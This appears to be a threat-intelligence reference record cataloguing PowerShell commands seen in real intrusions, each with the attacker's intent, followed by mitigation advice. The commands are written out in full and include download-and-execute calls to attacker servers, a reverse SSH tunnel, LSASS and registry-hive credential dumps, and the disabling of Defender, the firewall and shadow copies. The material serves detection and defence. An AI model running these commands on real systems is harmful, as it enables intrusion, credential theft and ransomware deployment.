objects.content:
Commands observed in intrusions. Each command is the exact text of the report it cites, followed by its intent: what the attacker used it for, from that report.

powershell.exe -WindowStyle Hidden -exec bypass -File "%APPDATA%\OneDrive.ps1"
    Intent: Persistence: saved in %APPDATA%\OneDrive.bat so the DarkHydrus payload script runs hidden each time the user logs on.
powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\cimv2:Win32_Base64Class').Properties['Prop'].Value);[MSDAC.PerfOSChecker]::StartCheck()
    Intent: Fileless persistence: loads FIN8's .NET payload, stored in a WMI class property, straight into memory; a WMI event runs it after each boot.
powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString('hxxps://37-10-71-215[.]nip[.]io:8443/7ea5fa')
    Intent: Launch the backdoor by downloading a script and running it in memory; the attackers ran it over PsExec.
"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71[.]182 -P 22 -l forward -pw Socks@123 -no-antispoof
    Intent: Open a reverse SSH tunnel with plink so the Exchange server's RDP port can be reached from the internet.
"powershell.exe" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip
    Intent: Credential access: dump LSASS memory with comsvcs.dll MiniDump and zip the dump for exfiltration.
powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46[.]154:3485/eiloShaegae1')"
    Intent: Download and run more code in memory from the attackers' server, fetched by the Rollover delivery documents.
powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\ProgramData\ZIPSDK\ProjectConfManagerNT.ini))));
    Intent: Decode and run the Base64-encoded PowerShell payload stored in a text file, the last step of the infection chain.
cmd /c start /b powershell -c Get-WmiObject -Query {SELECT * FROM Win32_DiskPartition WHERE Bootable = TRUE} >> c:\users\public\d
    Intent: Discovery during lateral movement: list bootable disk partitions and save the output to a file the attackers collect.
%COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc <BASE64>
    Intent: Run the PowerShell Empire loader, stored as an encoded command in a malicious Windows service.
Powershell -c “Get-ChildItem C:\ProgramData\sam.save, C:\ProgramData\security.save, C:\ProgramData\system.save ^| Compress-Archive -DestinationPath C:\Program\Dataout.zip”
    Intent: Credential theft: compress the exported SAM, SECURITY and SYSTEM registry hives into a ZIP file.
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “Get-WebServicesVirtualDirectory | Format-List”
    Intent: Reconnaissance on Exchange: list the configured web services virtual directories.
powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payload
    Intent: Run the AppleSeed backdoor DLL through regsvr32 from a hidden PowerShell window.
PowerShell.exe -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1
    Intent: Run the BONDUPDATER Trojan's PowerShell script dropped by the phishing document's macro.
"C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe" -w hidden -ep bypass -nop -Command "iex ((New-Object System.Net.WebClient).DownloadString('hxxps://h3.errantrefrainundocked[.]shop/riii2.aspx'))"
    Intent: Download and run the next Lumma Stealer stage in memory after a fake CAPTCHA tricks the user into running it.
powershell -Command Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName
    Intent: Discovery: list the DNS host names of every computer in Active Directory.
powershell.exe -Command PowerShell -Command “\”Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\””
    Intent: Inhibit recovery: delete all Volume Shadow Copies before encrypting files.
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled
    Intent: Defense evasion: turn off Defender real-time monitoring and stop and disable the Defender service.
powershell -Command Add-MpPreference -ExclusionPath C:\ -Force
    Intent: Defense evasion: exclude the whole C: drive from Defender scanning so the ransomware is not detected.
powershell -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Intent: Turn off Windows Firewall on every profile on each reachable host before deploying the ransomware.
powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1
    Intent: The threat actors used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.
powershell -ep bypass -c \"& {Import-Module c:\\sh.ps1; Invoke-BloodHound -CollectionMethod All}\" 1>c:\\ret.txt
    Intent: The actor used BloodHound and the SharpHound collector to map the trusts between various domains; this is one of two example commands executed through SharpHound.
powershell -nop -exec bypass -EncodedCommand 
    Intent: Defense evasion: the threat actors disabled Windows Defender with an encoded PowerShell command.
PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\AAA.exe');Start-Process('%TEMP%\\AAA.exe')
    Intent: The DDE exploit in the attached Word document ran this code to download AAA.exe from a remote server and start it.
powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AGUAJwApAA==
    Intent: An attacker was seen executing encoded PowerShell commands that download malware from a remote location after exploiting Exchange.
powershell -nop -exec bypass -c iex(new-object net.webclient).downloadstring('hxxps://raw[.]githubusercontent[.]com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack[.]ps1'); PowerSharpPack -Rubeus -Command "kerberoast"
    Intent: UNC2165 downloaded a Kerberoasting utility from GitHub (Figure 3).
powershell -c "(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\temp\sys.tmp1')" 1> \\127.0.0.1\ADMIN$\__1636727589.6007507 2>&1
    Intent: The attackers appear to have leveraged a Tomcat exploit to execute a PowerShell command, which was used to download a JPEG file from an internal server.
powershell -c "rundll32 C:\windows\system32\comsvcs.dll MiniDump 600 C:\asm\appdata\local\microsoft\windows\winupd.log full" 1> \\127.0.0.1\ADMIN$\__1638457529.1247072 2>&1
    Intent: PowerShell was used to dump credentials from the compromised machine before the wiper was deployed.
powershell -command "(New-Object Net.WebClient).DownloadFile('hxxp://msdl[.]microsoft[.]com/download/symbols/ntkrnlmp[.]pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp[.]pdb', 'CSIDL_SYSTEM_DRIVE\systemdata\ntkrnlmp.pdb')"
    Intent: On execution the BlackByte 2.0 payload downloads and saves debugging symbols from Microsoft; the command is executed directly from the ransomware.
powershell.exe -noni -nop -w 1 -enc IAAoAEcAZQB0AC0AQQBEAEQAbwBtAGEAaQBuACkALgBQAEQAQwBFAG0AdQBsAGEAdABvAHIA 1> \Windows\Temp\UDaYsR 2>&1

Sutherland, S. (2014, September 9). 15 Ways to Bypass the PowerShell Execution Policy. Retrieved September 12, 2024.

objects.description:
When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.(Citation: Netspi PowerShell Execution Policy Bypass)

PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.(Citation: Microsoft PS JEA)
Anti-virus can be used to automatically quarantine suspicious files.
Set PowerShell execution policy to execute only signed scripts.

It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.

Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.
